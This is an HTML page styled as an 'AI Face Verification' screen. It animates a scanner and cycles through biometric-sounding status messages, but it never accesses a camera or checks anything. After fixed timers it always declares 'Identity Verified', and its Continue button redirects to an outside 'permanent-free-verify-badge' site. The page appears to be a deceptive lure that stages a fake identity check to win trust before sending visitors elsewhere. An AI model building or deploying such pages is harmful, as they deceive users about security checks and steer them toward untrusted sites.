<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>AI Face Verification</title>

<style>
body {
  margin: 0;
  height: 100vh;
  background: radial-gradient(circle at center, #0f2027, #203a43, #2c5364);
  display: flex;
  justify-content: center;
  align-items: center;
  font-family: 'Segoe UI', sans-serif;
  color: #fff;
}

/* Glass container */
.container {
  width: 360px;
  padding: 30px;
  border-radius: 20px;
  backdrop-filter: blur(25px);
  background: rgba(255,255,255,0.05);
  box-shadow: 0 0 40px rgba(0,255,255,0.2);
  text-align: center;
}

/* Scanner */
.scanner {
  position: relative;
  width: 200px;
  height: 200px;
  margin: auto;
  border-radius: 50%;
  border: 2px solid rgba(0,255,255,0.3);
  overflow: hidden;
}

/* Animated scan line */
.scan-line {
  position: absolute;
  width: 100%;
  height: 4px;
  background: linear-gradient(to right, transparent, #00ffff, transparent);
  top: 0;
  animation: scan 2s infinite;
}

@keyframes scan {
  0% { top: 0; }
  100% { top: 100%; }
}

/* Glow ring */
.ring {
  position: absolute;
  inset: 0;
  border-radius: 50%;
  box-shadow: 0 0 25px #00ffff inset, 0 0 25px #00ffff;
  animation: pulse 2s infinite;
}

@keyframes pulse {
  0% { opacity: .6; }
  50% { opacity: 1; }
  100% { opacity: .6; }
}

/* Face icon */
.face {
  font-size: 60px;
  margin-top: 60px;
  z-index: 2;
  position: relative;
}

/* Status text */
.status {
  margin-top: 20px;
  font-size: 18px;
  letter-spacing: 1px;
}

/* Steps */
.steps {
  margin-top: 15px;
  font-size: 14px;
  opacity: 0.8;
}

.verified {
  display: none;
  font-size: 22px;
  color: #00ffcc;
  margin-top: 20px;
  animation: fade 1s ease forwards;
}

@keyframes fade {
  from {opacity:0; transform: translateY(10px);}
  to {opacity:1; transform: translateY(0);}
}

/* Button */
button {
  display: none;
  margin-top: 25px;
  padding: 12px 25px;
  border: none;
  border-radius: 8px;
  background: linear-gradient(45deg, #00ffff, #00ffcc);
  color: #000;
  font-weight: bold;
  cursor: pointer;
  transition: 0.3s;
}

button:hover {
  transform: scale(1.05);
}

</style>
</head>

<body>

<div class="container">

  <div class="scanner">
    <div class="ring"></div>
    <div class="scan-line"></div>
    <div class="face" id="faceIcon">🙂</div>
  </div>

  <div class="status" id="status">Initializing AI Scan...</div>
  <div class="steps" id="steps">Please hold still</div>

  <div class="verified" id="verified">✅ Identity Verified</div>
  <button id="btn">Continue</button>

</div>

<audio id="sound" src="https://assets.mixkit.co/sfx/preview/mixkit-confirmation-tone-2867.mp3"></audio>

<script>

const steps = [
  "Detecting face structure...",
  "Analyzing depth & contours...",
  "Matching biometric pattern...",
  "Finalizing verification..."
];

let i = 0;

function nextStep() {
  if (i < steps.length) {
    document.getElementById("steps").innerText = steps[i];
    i++;
    setTimeout(nextStep, 1200);
  } else {
    finish();
  }
}

function finish() {
  document.getElementById("sound").play();

  document.getElementById("status").style.display = "none";
  document.getElementById("steps").style.display = "none";

  document.getElementById("faceIcon").innerText = "✔";

  document.getElementById("verified").style.display = "block";
  document.getElementById("btn").style.display = "inline-block";
}

setTimeout(nextStep, 1500);

document.getElementById("btn").onclick = () => {
  window.location.href = "https://permanent-free-verify-badge.surge.sh/";
};

</script>

</body>
</html>
